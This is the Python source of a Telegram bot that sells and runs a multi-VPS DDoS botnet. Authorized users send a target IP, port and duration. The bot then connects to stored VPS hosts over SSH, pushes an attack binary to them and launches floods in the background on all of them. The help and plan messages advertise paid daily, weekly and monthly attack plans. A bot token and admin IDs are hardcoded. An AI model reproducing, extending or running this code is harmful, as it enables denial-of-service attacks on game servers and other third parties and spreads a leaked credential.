#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import paramiko
from scp import SCPClient

# REPLACE THIS WITH YOUR NEW BOT TOKEN FROM BOTFATHER
bot = telebot.TeleBot('8385016546:AAHuW9g3Pi6Bu73KCyaVEW5GPvhUxWhJ_jA')

# Admin user IDs
admin_id = ["5879359815", "521756472", "7147401720"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store VPS list
VPS_FILE = "vps_list.txt"

# File to store binary name
BINARY_FILE = "binary_name.txt"

# Default binary name
DEFAULT_BINARY_NAME = "bgmi"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read VPS list from file
def read_vps_list():
    try:
        with open(VPS_FILE, "r") as file:
            vps_list = []
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    parts = line.split('|')
                    if len(parts) == 4:
                        vps_list.append({
                            'host': parts[0].strip(),
                            'port': int(parts[1].strip()),
                            'username': parts[2].strip(),
                            'password': parts[3].strip()
                        })
            return vps_list
    except FileNotFoundError:
        return []

# Function to save VPS to file
def save_vps(host, port, username, password):
    with open(VPS_FILE, "a") as file:
        file.write(f"{host}|{port}|{username}|{password}\n")

# Function to get current binary name
def get_binary_name():
    try:
        with open(BINARY_FILE, "r") as file:
            return file.read().strip()
    except FileNotFoundError:
        # Set default binary name
        with open(BINARY_FILE, "w") as file:
            file.write(DEFAULT_BINARY_NAME)
        return DEFAULT_BINARY_NAME

# Function to set binary name
def set_binary_name(name):
    with open(BINARY_FILE, "w") as file:
        file.write(name)

# Function to check VPS status
def check_vps_status():
    vps_list = read_vps_list()
    status_results = []
    
    for vps in vps_list:
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to VPS with timeout
            ssh.connect(
                hostname=vps['host'],
                port=vps['port'],
                username=vps['username'],
                password=vps['password'],
                timeout=10
            )
            
            # Check if binary exists and is executable
            binary_name = get_binary_name()
            stdin, stdout, stderr = ssh.exec_command(f"ls -la ./{binary_name} 2>/dev/null")
            binary_exists = len(stdout.read().decode().strip()) > 0
            
            # Check system load
            stdin, stdout, stderr = ssh.exec_command("uptime")
            uptime_output = stdout.read().decode().strip()
            
            # Check running processes
            stdin, stdout, stderr = ssh.exec_command(f"ps aux | grep {binary_name} | grep -v grep")
            running_processes = len(stdout.read().decode().strip().split('\n')) - 1
            
            ssh.close()
            
            status = "🟢 ONLINE"
            details = f"Binary: {'✅' if binary_exists else '❌'}, Processes: {running_processes}"
            status_results.append(f"{status} - {vps['host']}:{vps['port']} - {details}")
            
        except Exception as e:
            status_results.append(f"🔴 OFFLINE - {vps['host']}:{vps['port']} - Error: {str(e)}")
    
    return status_results

# Function to reset VPS (kill all attack processes and restart if needed)
def reset_vps():
    vps_list = read_vps_list()
    reset_results = []
    binary_name = get_binary_name()
    
    for vps in vps_list:
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to VPS
            ssh.connect(
                hostname=vps['host'],
                port=vps['port'],
                username=vps['username'],
                password=vps['password'],
                timeout=10
            )
            
            # Kill all running attack processes
            stdin, stdout, stderr = ssh.exec_command(f"pkill -f {binary_name}")
            kill_output = stderr.read().decode()
            
            # Double check and force kill if any remaining
            stdin, stdout, stderr = ssh.exec_command(f"pgrep -f {binary_name}")
            pids = stdout.read().decode().strip()
            if pids:
                stdin, stdout, stderr = ssh.exec_command(f"kill -9 {pids}")
            
            # Check system load after reset
            stdin, stdout, stderr = ssh.exec_command("uptime")
            uptime_after = stdout.read().decode().strip()
            
            # Check if processes are cleared
            stdin, stdout, stderr = ssh.exec_command(f"ps aux | grep {binary_name} | grep -v grep | wc -l")
            remaining_processes = stdout.read().decode().strip()
            
            ssh.close()
            
            status = "🟢 RESET SUCCESS"
            details = f"Processes killed, Remaining: {remaining_processes}"
            reset_results.append(f"{status} - {vps['host']}:{vps['port']} - {details}")
            
        except Exception as e:
            reset_results.append(f"🔴 RESET FAILED - {vps['host']}:{vps['port']} - Error: {str(e)}")
    
    return reset_results

# Function to upload binary to all VPS
def upload_binary_to_all_vps(binary_path):
    vps_list = read_vps_list()
    binary_name = get_binary_name()
    results = []
    
    for vps in vps_list:
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to VPS
            ssh.connect(
                hostname=vps['host'],
                port=vps['port'],
                username=vps['username'],
                password=vps['password']
            )
            
            # Upload binary using SCP
            with SCPClient(ssh.get_transport()) as scp:
                scp.put(binary_path, f"./{binary_name}")
            
            # Make binary executable
            stdin, stdout, stderr = ssh.exec_command(f"chmod +x ./{binary_name}")
            
            ssh.close()
            results.append(f"✅ Successfully uploaded to {vps['host']}")
        except Exception as e:
            results.append(f"❌ Failed to upload to {vps['host']}: {str(e)}")
    
    return results

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# FIXED: Function to execute attack on all VPS
def execute_attack_on_all_vps(target, port, time):
    vps_list = read_vps_list()
    binary_name = get_binary_name()
    results = []
    
    for vps in vps_list:
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to VPS
            ssh.connect(
                hostname=vps['host'],
                port=vps['port'],
                username=vps['username'],
                password=vps['password']
            )
            
            # Execute attack command in background with proper nohup and get PID
            attack_command = f"nohup ./{binary_name} {target} {port} {time} 1000 > /dev/null 2>&1 & echo $!"
            stdin, stdout, stderr = ssh.exec_command(attack_command)
            pid = stdout.read().decode().strip()
            
            # Verify the process is running
            stdin, stdout, stderr = ssh.exec_command(f"ps -p {pid} > /dev/null 2>&1 && echo 'RUNNING' || echo 'NOT RUNNING'")
            status = stdout.read().decode().strip()
            
            ssh.close()
            
            if status == "RUNNING":
                results.append(f"✅ Attack started on {vps['host']} (PID: {pid})")
            else:
                results.append(f"⚠️ Attack may have failed on {vps['host']}")
                
        except Exception as e:
            results.append(f"❌ Failed to execute on {vps['host']}: {str(e)}")
    
    return results

# ADDED: Function to check running attacks
def check_running_attacks():
    vps_list = read_vps_list()
    binary_name = get_binary_name()
    results = []
    
    for vps in vps_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                hostname=vps['host'],
                port=vps['port'],
                username=vps['username'],
                password=vps['password']
            )
            
            # Check for running processes
            stdin, stdout, stderr = ssh.exec_command(f"ps aux | grep {binary_name} | grep -v grep")
            processes = stdout.read().decode().strip()
            
            if processes:
                process_count = len(processes.split('\n'))
                # Get process details
                process_details = []
                for line in processes.split('\n'):
                    if line.strip():
                        parts = line.split()
                        if len(parts) > 10:
                            process_details.append(f"PID:{parts[1]} {parts[10][:20]}...")
                
                details = ", ".join(process_details[:2])  # Show first 2 processes
                results.append(f"🟢 {vps['host']}: {process_count} attack(s) - {details}")
            else:
                results.append(f"⚪ {vps['host']}: No attacks running")
                
            ssh.close()
        except Exception as e:
            results.append(f"🔴 {vps['host']}: Error - {str(e)}")
    
    return results

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Online VPS status command
@bot.message_handler(commands=['onlinevps'])
def check_online_vps(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "🔄 Checking VPS status... Please wait.")
        
        status_results = check_vps_status()
        
        if status_results:
            response = "🔍 **VPS Status Report:**\n\n" + "\n".join(status_results)
            response += f"\n\n📊 **Summary:** {len([s for s in status_results if '🟢 ONLINE' in s])} Online / {len(status_results)} Total"
        else:
            response = "❌ No VPS configured. Use /addvps to add VPS first."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# Reset VPS command
@bot.message_handler(commands=['resetvps'])
def reset_all_vps(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "🔄 Resetting all VPS... This may take a moment.")
        
        # First reset all VPS
        reset_results = reset_vps()
        
        # Then check status after reset
        status_results = check_vps_status()
        
        response = "♻️ **VPS Reset Report:**\n\n"
        response += "**Reset Results:**\n" + "\n".join(reset_results)
        response += "\n\n**Status After Reset:**\n" + "\n".join(status_results)
        response += f"\n\n📊 **Final Status:** {len([s for s in status_results if '🟢 ONLINE' in s])} Online / {len(status_results)} Total"
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# ADDED: Running attacks command
@bot.message_handler(commands=['running'])
def show_running_attacks(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        results = check_running_attacks()
        response = "🔍 Current Running Attacks:\n\n" + "\n".join(results)
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Add VPS command
@bot.message_handler(commands=['addvps'])
def add_vps(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 5:
            host = command[1]
            try:
                port = int(command[2])
                username = command[3]
                password = command[4]
                
                save_vps(host, port, username, password)
                response = f"✅ VPS added successfully!\nHost: {host}\nPort: {port}\nUsername: {username}"
            except ValueError:
                response = "❌ Port must be a number"
        else:
            response = "✅ Usage: /addvps <host> <port> <username> <password>"
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# Set binary name command
@bot.message_handler(commands=['setbinary'])
def set_binary(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            binary_name = command[1]
            set_binary_name(binary_name)
            response = f"✅ Binary name set to: {binary_name}"
        else:
            response = "✅ Usage: /setbinary <binary_name>"
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# Upload binary command
@bot.message_handler(commands=['uploadbinary'])
def upload_binary(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if message.document:
            try:
                # Get file information
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                
                # Save file locally
                binary_name = get_binary_name()
                local_path = f"./{binary_name}"
                
                with open(local_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                
                # Make file executable
                os.chmod(local_path, 0o755)
                
                # Upload to all VPS
                results = upload_binary_to_all_vps(local_path)
                
                response = "📤 Binary upload results:\n" + "\n".join(results)
                
                # Clean up local file
                os.remove(local_path)
                
            except Exception as e:
                response = f"❌ Error uploading binary: {str(e)}"
        else:
            response = "❌ Please send the binary as a document file"
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 60

# FIXED: /bgmi command handler
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
                response = "You Are On Cooldown ❌. Please Wait 60sec Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 241:
                response = "Error: Time interval must be less than 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                
                # Execute attack on all VPS
                vps_results = execute_attack_on_all_vps(target, port, time)
                # FIXED: Changed from "Attack Finished" to "Attack Launched"
                response = f"🔥 BGMI Attack Launched!\nTarget: {target}\nPort: {port}\nTime: {time} seconds\n\nVPS Status:\n" + "\n".join(vps_results) + "\n\n📝 Note: Attack runs in background on VPS"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.


'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
🤖Try To Run This Command : /help 
WELCOME TO THE SERVER FREEZE BOT'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 240 (S)
> After Attack Limit : 3 Min
-> Concurrents Attack : 300

Pr-ice List💸 :
Day-->100 Rs
Week-->450 Rs
Month-->1000 Rs
'''
    bot.reply_to(message, response)

# UPDATED: Admin commands with new /running command
@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /addvps : Add a VPS to the network.
💥 /setbinary : Set the binary name for attacks.
💥 /uploadbinary : Upload binary to all VPS.
💥 /onlinevps : Check status of all VPS.
💥 /resetvps : Reset all VPS (kill attacks).
💥 /running : Check currently running attacks.
❤️ /info: public source.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)
# Document handler for binary uploads - CORRECTED VERSION
@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Check if this is likely a binary upload
        if message.document:
            try:
                # Check file size (optional)
                if message.document.file_size > 50 * 1024 * 1024:  # 50MB limit
                    bot.reply_to(message, "❌ File too large. Maximum size is 50MB.")
                    return
                
                # Get file information
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                
                # Save file locally
                binary_name = get_binary_name()
                local_path = f"./{binary_name}"
                
                with open(local_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                
                # Make file executable
                os.chmod(local_path, 0o755)
                
                # Upload to all VPS
                bot.reply_to(message, "🔄 Uploading binary to all VPS...")
                results = upload_binary_to_all_vps(local_path)
                
                response = "📤 Binary upload results:\n" + "\n".join(results)
                
                # Clean up local file
                os.remove(local_path)
                
                bot.reply_to(message, response)
            except Exception as e:
                # FIXED: Correct f-string syntax
                bot.reply_to(message, f"❌ Error uploading binary: {str(e)}")
        else:
            bot.reply_to(message, "❌ Please send the binary as a document file")
    else:
        bot.reply_to(message, "Only Admin Can Run This Command 😡.")

# Also keep the original /uploadbinary command handler but modify it
@bot.message_handler(commands=['uploadbinary'])
def upload_binary_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = """📁 **Binary Upload Instructions:**

Method 1: Send file with caption
• Tap **Attachment** → **Document**
• Select your binary file  
• Type `/uploadbinary` in caption
• Send

Method 2: Send command first, then file
• Send `/uploadbinary` 
• Then send the binary as document

✅ File will be distributed to all VPS automatically."""
    else:
        response = "Only Admin Can Run This Command 😡."
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['info'])
def show_info(message):
    response = '''🤖 Server Freeze Bot - Multi-VPS DDoS Bot

📁 Source: Private
👨‍💻 Developer: @FLAME1869
🔧 Version: 2.0 Multi-VPS Edition

✨ Features:
• Multi-VPS Attack Distribution
• Real-time VPS Status Monitoring
• Binary Management System
• User Management
• Attack Logging

⚡ Powered by Python + Telegram API
'''
    bot.reply_to(message, response)

# Handle unknown commands
@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    response = "❌ Unknown command. Use /help to see available commands."
    bot.reply_to(message, response)

if __name__ == "__main__":
    print("🤖 Bot starting...")
    print("📱 Make sure to replace '8385016546:AAHuW9g3Pi6Bu73KCyaVEW5GPvhUxWhJ_jA' with your actual bot token!")
    try:
        bot.polling()
    except Exception as e:
        print(f"❌ Error: {e}")